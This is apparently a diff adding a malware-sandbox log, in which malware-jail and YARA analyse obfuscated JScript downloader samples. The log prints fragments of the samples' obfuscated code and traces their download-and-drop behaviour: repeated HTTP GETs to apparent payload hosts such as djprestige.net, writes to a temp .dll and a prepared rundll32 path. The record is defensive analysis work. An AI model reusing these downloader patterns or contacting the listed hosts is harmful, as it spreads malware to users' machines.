+    at tugrik (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:102:12)
+    at eval (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:56:17)
+    at eval (<anonymous>)
+    at _ (malware-jail/env/eval.js:41:16)
+    at eval (malware-jail/env/eval.js:43:59)
+    at ./malware/localhost_05-18_18-42-0021_79154849/localhost_18-42-0021.js:6:5
+    at ContextifyScript.Script.runInContext (vm.js:59:29)
+    at Object.runInContext (vm.js:120:6)
+    at run_in_ctx (/home/ico/Desktop/Work/WebsiteRaker-20190424T100537Z-001/WebsiteRaker/malware-jail/jailme.js:325:16)
+18 May 18:42:22 - Exception occured: object undefined:71
+	catch(e) { util_log(">>> Silencing catch " + _inspect(e));Sleep(1000); continue;};
+	                                                          ^
+
+ReferenceError: Sleep is not defined
+    at eval (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:71:60)
+    at eval (<anonymous>)
+    at _ (malware-jail/env/eval.js:41:16)
+    at eval (malware-jail/env/eval.js:43:59)
+    at ./malware/localhost_05-18_18-42-0021_79154849/localhost_18-42-0021.js:6:5
+    at ContextifyScript.Script.runInContext (vm.js:59:29)
+    at Object.runInContext (vm.js:120:6)
+    at run_in_ctx (/home/ico/Desktop/Work/WebsiteRaker-20190424T100537Z-001/WebsiteRaker/malware-jail/jailme.js:325:16)
+    at Object.<anonymous> (/home/ico/Desktop/Work/WebsiteRaker-20190424T100537Z-001/WebsiteRaker/malware-jail/jailme.js:360:20)
+    at Module._compile (module.js:652:30)
+18 May 18:42:22 - ==> Cleaning up sandbox.
+18 May 18:42:22 - ==> Script execution finished, dumping sandbox environment to a file.
+18 May 18:42:22 - The sandbox context has been  saved to: malware-jail/sandbox_dump_after.json
+18 May 18:42:22 - Saving: malware-jail/../malware/localhost_05-18_18-42-0021_79154849/output/eval_1.js
+18 May 18:42:22 - Saving: malware-jail/../malware/localhost_05-18_18-42-0021_79154849/output/C__Users_User_AppData_Local_Temp_O5Oy3QuOk39yZ
+18 May 18:42:22 - Saving: malware-jail/../malware/localhost_05-18_18-42-0021_79154849/output/urls.json
+
+[18/05 18:42:22][info]Exporting results to: /results/localhost_18-42-0021.dynamic.log
+[18/05 18:42:22][info]Exporting results to: /results/localhost_18-42-0021.static.log
+[18/05 18:42:22][info]Dynamic URLs extracted from localhost_05-18_18-42-0021_79154849/localhost_18-42-0021.js and saved to ./malware/localhost_05-18_18-42-0021_79154849/output/urls.json
+[18/05 18:42:22][info]Initializing YARA localhost_05-18_18-42-0021_79154849/results/ <all files>
+[18/05 18:42:22][info]Process at 29513 | CMD: Optional[/usr/local/bin/yara -m -s -L -w -t PB_Dyn ./yararules/playbook_start.yar ./malware/localhost_05-18_18-42-0021_79154849/results]
+[18/05 18:42:22][info]79154849,/malware/localhost_05-18_18-42-0021_79154849/results/ <all files> ,90,Malicious
+[18/05 18:42:22][warning]Yara Debugger is enabled, massive log flood. USE for training a playbook!
+[18/05 18:42:22][info]Default IE Selected: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+[18/05 18:42:22][info][2AF7E245]Injecting Transaction Monitor
+[18/05 18:42:22][info](2AF7E245)Starting job http://localhost/malware_samples/f8a2000751f36c4ad394fd7f4cf848bd.html
+[18/05 18:42:22][info](2AF7E245)Last page Navigated to http://localhost/malware_samples/f8a2000751f36c4ad394fd7f4cf848bd.html status: 200 OK date: Sat, 18 May 2019 15:42:22 GMT
+[18/05 18:42:22][info]Found frames: 0
+[18/05 18:42:22][info]Creating virtual page file: /home/ico/Desktop/Work/WebsiteRaker-20190424T100537Z-001/WebsiteRaker/malware/localhost_05-18_18-42-0022_2AF7E245/localhost_18-42-0022.js
+[18/05 18:42:22][info]Processing command for NodeJS in folder localhost_05-18_18-42-0022_2AF7E245 and file localhost_18-42-0022.js
+[18/05 18:42:22][info]Process at 29547 | CMD: Optional[/usr/bin/node ./malware-jail/jailme.js --h404 -t 15000 -c ./config_localhost_05-18_18-42-0022_2AF7E245.json ./malware/localhost_05-18_18-42-0022_2AF7E245/localhost_18-42-0022.js]
+[18/05 18:42:23][warning]Uncaught Exception occured, scanning results might be innacurate: 
+18 May 18:42:22 - mailware-jail, a malware sandbox ver. 0.19
+18 May 18:42:22 - ------------------------
+18 May 18:42:22 - Arguments: --h404 -t 15000 -c ./config_localhost_05-18_18-42-0022_2AF7E245.json ./malware/localhost_05-18_18-42-0022_2AF7E245/localhost_18-42-0022.js
+18 May 18:42:22 - Sandbox environment sequence: malware-jail/env/utils.js,malware-jail/env/eval.js,malware-jail/env/function.js,malware-jail/env/wscript.js,malware-jail/env/browser.js,malware-jail/env/agents.js,malware-jail/env/other.js,malware-jail/env/console.js
+18 May 18:42:22 - Malware files: ./malware/localhost_05-18_18-42-0022_2AF7E245/localhost_18-42-0022.js
+18 May 18:42:22 - Execution timeout set to: 15 seconds
+18 May 18:42:22 - Output file for sandbox dump: malware-jail/sandbox_dump_after.json
+18 May 18:42:22 - Output directory for generated files: malware-jail/../malware/localhost_05-18_18-42-0022_2AF7E245/output/
+18 May 18:42:22 - Download from remote server: Return HTTP/404
+18 May 18:42:22 - ==> Preparing Sandbox environment.
+18 May 18:42:22 -  => Executing: malware-jail/env/utils.js quitely
+18 May 18:42:22 -  => Executing: malware-jail/env/eval.js quitely
+18 May 18:42:22 -  => Executing: malware-jail/env/function.js quitely
+18 May 18:42:22 -  => Executing: malware-jail/env/wscript.js quitely
+18 May 18:42:22 -  => Executing: malware-jail/env/browser.js quitely
+18 May 18:42:22 -  => Executing: malware-jail/env/agents.js quitely
+18 May 18:42:22 -  => Executing: malware-jail/env/other.js quitely
+18 May 18:42:22 -  => Executing: malware-jail/env/console.js quitely
+18 May 18:42:22 - ==> Executing malware file(s). =========================================
+18 May 18:42:22 -  => Executing: ./malware/localhost_05-18_18-42-0022_2AF7E245/localhost_18-42-0022.js verbosely, reporting silent catches
+18 May 18:42:22 - Saving: malware-jail/../malware/localhost_05-18_18-42-0022_2AF7E245/output/._malware_localhost_05-18_18-42-0022_2AF7E245_localhost_18-42-0022.js
+18 May 18:42:22 - Saving: malware-jail/../malware/localhost_05-18_18-42-0022_2AF7E245/output/tr_._malware_localhost_05-18_18-42-0022_2AF7E245_localhost_18-42-0022.js
+18 May 18:42:22 - WScript.scriptfullname = (string) './malware/localhost_05-18_18-42-0022_2AF7E245/localhost_18-42-0022.js'
+18 May 18:42:22 - WScript.arguments = (object) './malware/localhost_05-18_18-42-0022_2AF7E245/localhost_18-42-0022.js,xyz'
+18 May 18:42:23 - Calling eval[1]('function e(){?    var _hsiyudgfustdg = "WS"+""+"c"+"r"+"i"+"pt";?    var _c = "\%Sy"+"st"+""+"em"+"Root\%\\s"+"ystem32\\cmd."+"ex"+"e";?     var _87867t67t6gt = this[_hsiyudgfustdg]["Cre"+"ateOb"+"ject"](_hsiyudgfustdg+".She"+"ll"); ?    var _87g6sd5 ... (truncated)')
+18 May 18:42:23 - WScript.CreateObject(WScript.Shell)
+18 May 18:42:23 - new WScript.Shell[14]
+18 May 18:42:23 - new WshEnvironment[15](SYSTEM)
+18 May 18:42:23 - WScript.Shell[14].Environment(SYSTEM)
+18 May 18:42:23 - WshEnvironment[15](SYSTEM)(COMSPEC) => C:\WINDOWS\system32\cmd.exe
+18 May 18:42:23 - Exception occured: object undefined:8
+	else {this[this["_hsiyudgfustdg"]]["Qui"+""+"t"](1);};
+	                                  ^
+
+TypeError: Cannot read property 'Quit' of undefined
+    at e (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:8:36)
+    at eval (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:10:1)
+    at eval (<anonymous>)
+    at _ (malware-jail/env/eval.js:41:16)
+    at eval (malware-jail/env/eval.js:43:59)
+    at ./malware/localhost_05-18_18-42-0022_2AF7E245/localhost_18-42-0022.js:15:6
+    at ContextifyScript.Script.runInContext (vm.js:59:29)
+    at Object.runInContext (vm.js:120:6)
+    at run_in_ctx (/home/ico/Desktop/Work/WebsiteRaker-20190424T100537Z-001/WebsiteRaker/malware-jail/jailme.js:325:16)
+    at Object.<anonymous> (/home/ico/Desktop/Work/WebsiteRaker-20190424T100537Z-001/WebsiteRaker/malware-jail/jailme.js:360:20)
+18 May 18:42:23 - ==> Cleaning up sandbox.
+18 May 18:42:23 - ==> Script execution finished, dumping sandbox environment to a file.
+18 May 18:42:23 - The sandbox context has been  saved to: malware-jail/sandbox_dump_after.json
+18 May 18:42:23 - Saving: malware-jail/../malware/localhost_05-18_18-42-0022_2AF7E245/output/eval_1.js
+
+[18/05 18:42:23][info]Exporting results to: /results/localhost_18-42-0022.dynamic.log
+[18/05 18:42:23][info]Exporting results to: /results/localhost_18-42-0022.static.log
+[18/05 18:42:23][info]No Dynamic URLs extracted from: localhost_05-18_18-42-0022_2AF7E245/localhost_18-42-0022.js
+[18/05 18:42:23][info]Initializing YARA localhost_05-18_18-42-0022_2AF7E245/results/ <all files>
+[18/05 18:42:23][info]Process at 29563 | CMD: Optional[/usr/local/bin/yara -m -s -L -w -t PB_Dyn ./yararules/playbook_start.yar ./malware/localhost_05-18_18-42-0022_2AF7E245/results]
+[18/05 18:42:23][info]2AF7E245,/malware/localhost_05-18_18-42-0022_2AF7E245/results/ <all files> ,50,Undetermined
+[18/05 18:42:23][warning]Yara Debugger is enabled, massive log flood. USE for training a playbook!
+[18/05 18:42:23][info]Default IE Selected: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+[18/05 18:42:23][info][A9012821]Injecting Transaction Monitor
+[18/05 18:42:23][info](A9012821)Starting job http://localhost/malware_samples/d2cb0e88476090f4332afcf8a413d131.html
+[18/05 18:42:23][info](A9012821)Last page Navigated to http://localhost/malware_samples/d2cb0e88476090f4332afcf8a413d131.html status: 200 OK date: Sat, 18 May 2019 15:42:23 GMT
+[18/05 18:42:23][info]Found frames: 0
+[18/05 18:42:23][info]Creating virtual page file: /home/ico/Desktop/Work/WebsiteRaker-20190424T100537Z-001/WebsiteRaker/malware/localhost_05-18_18-42-0023_A9012821/localhost_18-42-0023.js
+[18/05 18:42:23][info]Processing command for NodeJS in folder localhost_05-18_18-42-0023_A9012821 and file localhost_18-42-0023.js
+[18/05 18:42:23][info]Process at 29597 | CMD: Optional[/usr/bin/node ./malware-jail/jailme.js --h404 -t 15000 -c ./config_localhost_05-18_18-42-0023_A9012821.json ./malware/localhost_05-18_18-42-0023_A9012821/localhost_18-42-0023.js]
+[18/05 18:42:23][info]Exporting results to: /results/localhost_18-42-0023.dynamic.log
+[18/05 18:42:23][info]Exporting results to: /results/localhost_18-42-0023.static.log
+[18/05 18:42:23][info]Dynamic URLs extracted from localhost_05-18_18-42-0023_A9012821/localhost_18-42-0023.js and saved to ./malware/localhost_05-18_18-42-0023_A9012821/output/urls.json
+[18/05 18:42:23][info]Initializing YARA localhost_05-18_18-42-0023_A9012821/results/ <all files>
+[18/05 18:42:23][info]Process at 29613 | CMD: Optional[/usr/local/bin/yara -m -s -L -w -t PB_Dyn ./yararules/playbook_start.yar ./malware/localhost_05-18_18-42-0023_A9012821/results]
+[18/05 18:42:23][info]A9012821,/malware/localhost_05-18_18-42-0023_A9012821/results/ <all files> ,40,Undetermined
+[18/05 18:42:23][warning]Yara Debugger is enabled, massive log flood. USE for training a playbook!
+[18/05 18:42:23][info]Default IE Selected: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+[18/05 18:42:23][info][8346BE7A]Injecting Transaction Monitor
+[18/05 18:42:23][info](8346BE7A)Starting job http://localhost/malware_samples/26a27c3268aa09eba45ffde1c0d52915.html
+[18/05 18:42:23][info](8346BE7A)Last page Navigated to http://localhost/malware_samples/26a27c3268aa09eba45ffde1c0d52915.html status: 200 OK date: Sat, 18 May 2019 15:42:23 GMT
+[18/05 18:42:23][info]Found frames: 0
+[18/05 18:42:23][info]Creating virtual page file: /home/ico/Desktop/Work/WebsiteRaker-20190424T100537Z-001/WebsiteRaker/malware/localhost_05-18_18-42-0023_8346BE7A/localhost_18-42-0023.js
+[18/05 18:42:23][info]Processing command for NodeJS in folder localhost_05-18_18-42-0023_8346BE7A and file localhost_18-42-0023.js
+[18/05 18:42:23][info]Process at 29647 | CMD: Optional[/usr/bin/node ./malware-jail/jailme.js --h404 -t 15000 -c ./config_localhost_05-18_18-42-0023_8346BE7A.json ./malware/localhost_05-18_18-42-0023_8346BE7A/localhost_18-42-0023.js]
+[18/05 18:42:39][warning]Uncaught Exception occured, scanning results might be innacurate: 
+18 May 18:42:24 - mailware-jail, a malware sandbox ver. 0.19
+18 May 18:42:24 - ------------------------
+18 May 18:42:24 - Arguments: --h404 -t 15000 -c ./config_localhost_05-18_18-42-0023_8346BE7A.json ./malware/localhost_05-18_18-42-0023_8346BE7A/localhost_18-42-0023.js
+18 May 18:42:24 - Sandbox environment sequence: malware-jail/env/utils.js,malware-jail/env/eval.js,malware-jail/env/function.js,malware-jail/env/wscript.js,malware-jail/env/browser.js,malware-jail/env/agents.js,malware-jail/env/other.js,malware-jail/env/console.js
+18 May 18:42:24 - Malware files: ./malware/localhost_05-18_18-42-0023_8346BE7A/localhost_18-42-0023.js
+18 May 18:42:24 - Execution timeout set to: 15 seconds
+18 May 18:42:24 - Output file for sandbox dump: malware-jail/sandbox_dump_after.json
+18 May 18:42:24 - Output directory for generated files: malware-jail/../malware/localhost_05-18_18-42-0023_8346BE7A/output/
+18 May 18:42:24 - Download from remote server: Return HTTP/404
+18 May 18:42:24 - ==> Preparing Sandbox environment.
+18 May 18:42:24 -  => Executing: malware-jail/env/utils.js quitely
+18 May 18:42:24 -  => Executing: malware-jail/env/eval.js quitely
+18 May 18:42:24 -  => Executing: malware-jail/env/function.js quitely
+18 May 18:42:24 -  => Executing: malware-jail/env/wscript.js quitely
+18 May 18:42:24 -  => Executing: malware-jail/env/browser.js quitely
+18 May 18:42:24 -  => Executing: malware-jail/env/agents.js quitely
+18 May 18:42:24 -  => Executing: malware-jail/env/other.js quitely
+18 May 18:42:24 -  => Executing: malware-jail/env/console.js quitely
+18 May 18:42:24 - ==> Executing malware file(s). =========================================
+18 May 18:42:24 -  => Executing: ./malware/localhost_05-18_18-42-0023_8346BE7A/localhost_18-42-0023.js verbosely, reporting silent catches
+18 May 18:42:24 - Saving: malware-jail/../malware/localhost_05-18_18-42-0023_8346BE7A/output/._malware_localhost_05-18_18-42-0023_8346BE7A_localhost_18-42-0023.js
+18 May 18:42:24 - Saving: malware-jail/../malware/localhost_05-18_18-42-0023_8346BE7A/output/tr_._malware_localhost_05-18_18-42-0023_8346BE7A_localhost_18-42-0023.js
+18 May 18:42:24 - WScript.scriptfullname = (string) './malware/localhost_05-18_18-42-0023_8346BE7A/localhost_18-42-0023.js'
+18 May 18:42:24 - WScript.arguments = (object) './malware/localhost_05-18_18-42-0023_8346BE7A/localhost_18-42-0023.js,xyz'
+18 May 18:42:24 - WScript.CreateObject(WScript.Shell)
+18 May 18:42:24 - new WScript.Shell[14]
+18 May 18:42:24 - new WshEnvironment[15](SYSTEM)
+18 May 18:42:24 - WScript.Shell[14].Environment(SYSTEM)
+18 May 18:42:24 - WshEnvironment[15](SYSTEM)(COMSPEC) => C:\WINDOWS\system32\cmd.exe
+18 May 18:42:24 - Calling eval[1]('function fuckit(){?    var _wscript = "WScript";?    var zzz = WScript.CreateObject(_wscript+".Shell");?    var se = zzz["E"+"nvironment"]("S"+"Y"+"STEM");?    var zz = se("ComSpec");?    if (zz != "\%SystemRoot\%\system32\cmd.ex"+"e") {zz = 0/0;};?  ... (truncated)')
+18 May 18:42:24 - WScript.CreateObject(WScript.Shell)
+18 May 18:42:24 - new WScript.Shell[16]
+18 May 18:42:24 - new WshEnvironment[17](SYSTEM)
+18 May 18:42:24 - WScript.Shell[16].Environment(SYSTEM)
+18 May 18:42:24 - WshEnvironment[17](SYSTEM)(COMSPEC) => C:\WINDOWS\system32\cmd.exe
+18 May 18:42:24 - WScript.CreateObject(WScript.Shell)
+18 May 18:42:24 - new WScript.Shell[18]
+18 May 18:42:24 - WScript.Shell[18].ExpandEnvironmentStrings(%TEMP%/) => C:\Users\User\AppData\Local\Temp/
+18 May 18:42:24 - new WshEnvironment[19](SYSTEM)
+18 May 18:42:24 - WScript.Shell[18].Environment(System)
+18 May 18:42:24 - WshEnvironment[19](SYSTEM)(PROCESSOR_ARCHITECTURE) => AMD64
+18 May 18:42:24 - WScript.Shell[18].ExpandEnvironmentStrings(%SystemRoot%\SysWOW64\rundll32.exe) => C:\WINDOWS\SysWOW64\rundll32.exe
+18 May 18:42:24 - WScript.CreateObject(MSXML2.XMLHTTP)
+18 May 18:42:24 - new MSXML2.XMLHTTP[20]
+18 May 18:42:24 - MSXML2.XMLHTTP[20].onreadystatechange = (undefined) 'undefined'
+18 May 18:42:24 - ActiveXObject(Scripting.FileSystemObject)
+18 May 18:42:24 - new Scripting.FileSystemObject[21]
+18 May 18:42:24 - new DriveObject[22](C:)
+18 May 18:42:24 - DriveObject[22](C:).name = (string) 'C:'
+18 May 18:42:24 - new Collection[23]([ DriveObject {?    id: 22,?    _name: 'DriveObject[22](C:)',?    _availablespace: '',?    _driveletter: '',?    _drivetype: '',?    _filesystem: '',?    _freespace: '',?    _isready: '',?    _path: '',?    _rootfolder: '',?    _serialnumber: '',?    ... (truncated))
+18 May 18:42:24 - Collection[23].count = (number) '1'
+18 May 18:42:24 - Scripting.FileSystemObject[21].FileExists(C:\Users\User\AppData\Local\Temp/tO7i5T0baEMUO7.dll) => false
+18 May 18:42:24 - MSXML2.XMLHTTP[20].open(GET,http://djprestige.net/86o7nou4,false)
+18 May 18:42:24 - MSXML2.XMLHTTP[20].method = (string) 'GET'
+18 May 18:42:24 - MSXML2.XMLHTTP[20].url = (string) 'http://djprestige.net/86o7nou4'
+18 May 18:42:24 - MSXML2.XMLHTTP[20].async = (boolean) 'false'
+18 May 18:42:24 - MSXML2.XMLHTTP[20].send(undefined)
+18 May 18:42:24 - MSXML2.XMLHTTP[20] Intentionally returning HTTP/404
+18 May 18:42:24 - MSXML2.XMLHTTP[20].responsebody = (string) 'HTTP/404 Resource not found'
+18 May 18:42:24 - MSXML2.XMLHTTP[20].status = (number) '404'
+18 May 18:42:24 - MSXML2.XMLHTTP[20].readystate = (number) '4'
+18 May 18:42:24 - MSXML2.XMLHTTP[20].onreadystatechange.get() => (undefined) 'undefined'
+18 May 18:42:24 - MSXML2.XMLHTTP[20].send(undefined) finished
+18 May 18:42:24 - MSXML2.XMLHTTP[20].readystate.get() => (number) '4'
+18 May 18:42:24 - WScript.CreateObject(ADODB.Stream)
+18 May 18:42:24 - new ADODB_Stream[24]
+18 May 18:42:24 - ADODB_Stream[24].Open()
+18 May 18:42:24 - ADODB_Stream[24].type = (number) '1'
+18 May 18:42:24 - MSXML2.XMLHTTP[20].responsebody.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:24 - ADODB_Stream[24].content = (string) 'HTTP/404 Resource not found'
+18 May 18:42:24 - ADODB_Stream[24].Write(str) - 27 bytes
+18 May 18:42:24 - ADODB_Stream[24].size = (number) '27'
+18 May 18:42:24 - ADODB_Stream[24].position = (number) '0'
+18 May 18:42:24 - ADODB_Stream[24].SaveToFile(C:\Users\User\AppData\Local\Temp/tO7i5T0baEMUO7, 2)
+18 May 18:42:24 - ADODB_Stream[24].content.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:24 - ADODB_Stream[24].Close()
+18 May 18:42:24 - WScript.CreateObject(ADODB.Stream)
+18 May 18:42:24 - new ADODB_Stream[25]
+18 May 18:42:24 - ADODB_Stream[25].type = (number) '2'
+18 May 18:42:24 - ADODB_Stream[25].charset = (string) '437'
+18 May 18:42:24 - ADODB_Stream[25].Open()
+18 May 18:42:24 - ADODB_Stream[25].type.get() => (number) '2'
+18 May 18:42:24 - ADODB_Stream[25].charset.get() => (string) '437'
+18 May 18:42:24 - ADODB_Stream[25].charset.get() => (string) '437'
+18 May 18:42:24 - ADODB_Stream[25].content = (string) 'HTTP/404 Resource not found'
+18 May 18:42:24 - ADODB_Stream[25].charset.get() => (string) '437'
+18 May 18:42:24 - ADODB_Stream[25].content.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:24 - ADODB_Stream[25].LoadFromFile(C:\Users\User\AppData\Local\Temp/tO7i5T0baEMUO7) 27 bytes, encoding: 437
+18 May 18:42:24 - ADODB_Stream[25].position = (number) '0'
+18 May 18:42:24 - ADODB_Stream[25].Close()
+18 May 18:42:24 - >>> Silencing catch TypeError: IBx3[((OBc + NOs) + Pp)] is not a function
+    at St (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:667:30)
+    at OMb (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:527:12)
+    at eval (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:461:12)
+    at eval (<anonymous>)
+    at _ (malware-jail/env/eval.js:41:16)
+    at eval (malware-jail/env/eval.js:43:59)
+    at ./malware/localhost_05-18_18-42-0023_8346BE7A/localhost_18-42-0023.js:21:6
+    at ContextifyScript.Script.runInContext (vm.js:59:29)
+    at Object.runInContext (vm.js:120:6)
+    at run_in_ctx (/home/ico/Desktop/Work/WebsiteRaker-20190424T100537Z-001/WebsiteRaker/malware-jail/jailme.js:325:16)
+18 May 18:42:24 - WScript.Sleep(1000)
+18 May 18:42:25 - Scripting.FileSystemObject[21].FileExists(C:\Users\User\AppData\Local\Temp/tO7i5T0baEMUO7.dll) => false
+18 May 18:42:25 - MSXML2.XMLHTTP[20].open(GET,http://djprestige.net/86o7nou4,false)
+18 May 18:42:25 - MSXML2.XMLHTTP[20].method = (string) 'GET'
+18 May 18:42:25 - MSXML2.XMLHTTP[20].url = (string) 'http://djprestige.net/86o7nou4'
+18 May 18:42:25 - MSXML2.XMLHTTP[20].async = (boolean) 'false'
+18 May 18:42:25 - MSXML2.XMLHTTP[20].send(undefined)
+18 May 18:42:25 - MSXML2.XMLHTTP[20] Intentionally returning HTTP/404
+18 May 18:42:25 - MSXML2.XMLHTTP[20].responsebody = (string) 'HTTP/404 Resource not found'
+18 May 18:42:25 - MSXML2.XMLHTTP[20].status = (number) '404'
+18 May 18:42:25 - MSXML2.XMLHTTP[20].readystate = (number) '4'
+18 May 18:42:25 - MSXML2.XMLHTTP[20].onreadystatechange.get() => (undefined) 'undefined'
+18 May 18:42:25 - MSXML2.XMLHTTP[20].send(undefined) finished
+18 May 18:42:25 - MSXML2.XMLHTTP[20].readystate.get() => (number) '4'
+18 May 18:42:25 - WScript.CreateObject(ADODB.Stream)
+18 May 18:42:25 - new ADODB_Stream[26]
+18 May 18:42:25 - ADODB_Stream[26].Open()
+18 May 18:42:25 - ADODB_Stream[26].type = (number) '1'
+18 May 18:42:25 - MSXML2.XMLHTTP[20].responsebody.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:25 - ADODB_Stream[26].content = (string) 'HTTP/404 Resource not found'
+18 May 18:42:25 - ADODB_Stream[26].Write(str) - 27 bytes
+18 May 18:42:25 - ADODB_Stream[26].size = (number) '27'
+18 May 18:42:25 - ADODB_Stream[26].position = (number) '0'
+18 May 18:42:25 - ADODB_Stream[26].SaveToFile(C:\Users\User\AppData\Local\Temp/tO7i5T0baEMUO7, 2)
+18 May 18:42:25 - ADODB_Stream[26].content.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:25 - ADODB_Stream[26].Close()
+18 May 18:42:25 - WScript.CreateObject(ADODB.Stream)
+18 May 18:42:25 - new ADODB_Stream[27]
+18 May 18:42:25 - ADODB_Stream[27].type = (number) '2'
+18 May 18:42:25 - ADODB_Stream[27].charset = (string) '437'
+18 May 18:42:25 - ADODB_Stream[27].Open()
+18 May 18:42:25 - ADODB_Stream[27].type.get() => (number) '2'
+18 May 18:42:25 - ADODB_Stream[27].charset.get() => (string) '437'
+18 May 18:42:25 - ADODB_Stream[27].charset.get() => (string) '437'
+18 May 18:42:25 - ADODB_Stream[27].content = (string) 'HTTP/404 Resource not found'
+18 May 18:42:25 - ADODB_Stream[27].charset.get() => (string) '437'
+18 May 18:42:25 - ADODB_Stream[27].content.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:25 - ADODB_Stream[27].LoadFromFile(C:\Users\User\AppData\Local\Temp/tO7i5T0baEMUO7) 27 bytes, encoding: 437
+18 May 18:42:25 - ADODB_Stream[27].position = (number) '0'
+18 May 18:42:25 - ADODB_Stream[27].Close()
+18 May 18:42:25 - >>> Silencing catch TypeError: IBx3[((OBc + NOs) + Pp)] is not a function
+    at St (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:667:30)
+    at OMb (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:527:12)
+    at eval (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:461:12)
+    at eval (<anonymous>)
+    at _ (malware-jail/env/eval.js:41:16)
+    at eval (malware-jail/env/eval.js:43:59)
+    at ./malware/localhost_05-18_18-42-0023_8346BE7A/localhost_18-42-0023.js:21:6
+    at ContextifyScript.Script.runInContext (vm.js:59:29)
+    at Object.runInContext (vm.js:120:6)
+    at run_in_ctx (/home/ico/Desktop/Work/WebsiteRaker-20190424T100537Z-001/WebsiteRaker/malware-jail/jailme.js:325:16)
+18 May 18:42:25 - WScript.Sleep(1000)
+18 May 18:42:26 - Scripting.FileSystemObject[21].FileExists(C:\Users\User\AppData\Local\Temp/tO7i5T0baEMUO7.dll) => false
+18 May 18:42:26 - MSXML2.XMLHTTP[20].open(GET,http://brothermalw.ws/0b24a,false)
+18 May 18:42:26 - MSXML2.XMLHTTP[20].method = (string) 'GET'
+18 May 18:42:26 - MSXML2.XMLHTTP[20].url = (string) 'http://brothermalw.ws/0b24a'
+18 May 18:42:26 - MSXML2.XMLHTTP[20].async = (boolean) 'false'
+18 May 18:42:26 - MSXML2.XMLHTTP[20].send(undefined)
+18 May 18:42:26 - MSXML2.XMLHTTP[20] Intentionally returning HTTP/404
+18 May 18:42:26 - MSXML2.XMLHTTP[20].responsebody = (string) 'HTTP/404 Resource not found'
+18 May 18:42:26 - MSXML2.XMLHTTP[20].status = (number) '404'
+18 May 18:42:26 - MSXML2.XMLHTTP[20].readystate = (number) '4'
+18 May 18:42:26 - MSXML2.XMLHTTP[20].onreadystatechange.get() => (undefined) 'undefined'
+18 May 18:42:26 - MSXML2.XMLHTTP[20].send(undefined) finished
+18 May 18:42:26 - MSXML2.XMLHTTP[20].readystate.get() => (number) '4'
+18 May 18:42:26 - WScript.CreateObject(ADODB.Stream)
+18 May 18:42:26 - new ADODB_Stream[28]
+18 May 18:42:26 - ADODB_Stream[28].Open()
+18 May 18:42:26 - ADODB_Stream[28].type = (number) '1'
+18 May 18:42:26 - MSXML2.XMLHTTP[20].responsebody.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:26 - ADODB_Stream[28].content = (string) 'HTTP/404 Resource not found'
+18 May 18:42:26 - ADODB_Stream[28].Write(str) - 27 bytes
+18 May 18:42:26 - ADODB_Stream[28].size = (number) '27'
+18 May 18:42:26 - ADODB_Stream[28].position = (number) '0'
+18 May 18:42:26 - ADODB_Stream[28].SaveToFile(C:\Users\User\AppData\Local\Temp/tO7i5T0baEMUO7, 2)
+18 May 18:42:26 - ADODB_Stream[28].content.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:26 - ADODB_Stream[28].Close()
+18 May 18:42:26 - WScript.CreateObject(ADODB.Stream)
+18 May 18:42:26 - new ADODB_Stream[29]
+18 May 18:42:26 - ADODB_Stream[29].type = (number) '2'
+18 May 18:42:26 - ADODB_Stream[29].charset = (string) '437'
+18 May 18:42:26 - ADODB_Stream[29].Open()
+18 May 18:42:26 - ADODB_Stream[29].type.get() => (number) '2'
+18 May 18:42:26 - ADODB_Stream[29].charset.get() => (string) '437'
+18 May 18:42:26 - ADODB_Stream[29].charset.get() => (string) '437'
+18 May 18:42:26 - ADODB_Stream[29].content = (string) 'HTTP/404 Resource not found'
+18 May 18:42:26 - ADODB_Stream[29].charset.get() => (string) '437'
+18 May 18:42:26 - ADODB_Stream[29].content.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:26 - ADODB_Stream[29].LoadFromFile(C:\Users\User\AppData\Local\Temp/tO7i5T0baEMUO7) 27 bytes, encoding: 437
+18 May 18:42:26 - ADODB_Stream[29].position = (number) '0'
+18 May 18:42:26 - ADODB_Stream[29].Close()
+18 May 18:42:26 - >>> Silencing catch TypeError: IBx3[((OBc + NOs) + Pp)] is not a function
+    at St (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:667:30)
+    at OMb (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:527:12)
+    at eval (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:461:12)
+    at eval (<anonymous>)
+    at _ (malware-jail/env/eval.js:41:16)
+    at eval (malware-jail/env/eval.js:43:59)
+    at ./malware/localhost_05-18_18-42-0023_8346BE7A/localhost_18-42-0023.js:21:6
+    at ContextifyScript.Script.runInContext (vm.js:59:29)
+    at Object.runInContext (vm.js:120:6)
+    at run_in_ctx (/home/ico/Desktop/Work/WebsiteRaker-20190424T100537Z-001/WebsiteRaker/malware-jail/jailme.js:325:16)
+18 May 18:42:26 - WScript.Sleep(1000)
+18 May 18:42:27 - Scripting.FileSystemObject[21].FileExists(C:\Users\User\AppData\Local\Temp/tO7i5T0baEMUO7.dll) => false
+18 May 18:42:27 - MSXML2.XMLHTTP[20].open(GET,http://hirokuns06.web.fc2.com/xmo6cxi9,false)
+18 May 18:42:27 - MSXML2.XMLHTTP[20].method = (string) 'GET'
+18 May 18:42:27 - MSXML2.XMLHTTP[20].url = (string) 'http://hirokuns06.web.fc2.com/xmo6cxi9'
